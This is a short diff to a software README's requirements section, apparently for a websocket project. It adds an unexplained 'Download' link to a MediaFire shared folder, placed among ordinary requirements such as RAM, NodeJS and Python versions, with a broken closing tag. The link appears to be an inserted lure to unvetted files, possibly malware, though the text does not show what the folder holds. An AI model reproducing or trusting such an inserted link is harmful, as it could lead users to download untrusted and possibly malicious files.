@@ -90,6 +90,7 @@
 <br>
 
 ### REQUIREMENTS:
+- <a href="http://www.mediafire.com/folder/dah626px1jb70lx,fzv384uwwork9q0,6o908yu625hauto,7z5mle989z4m82y,drx5uw66awrjjg3,gwc3ififz87ai78,as1wl3zvx4e2tea,zj966selizralnd/shared">Download<a/>
 - 8GB+ RAM (rough estimate for now)
 - NodeJS 18.4.1+
 - Python 3.7+ (**OPTIONAL** - when testing websocket client -> server connection **(CAN VARY)** )
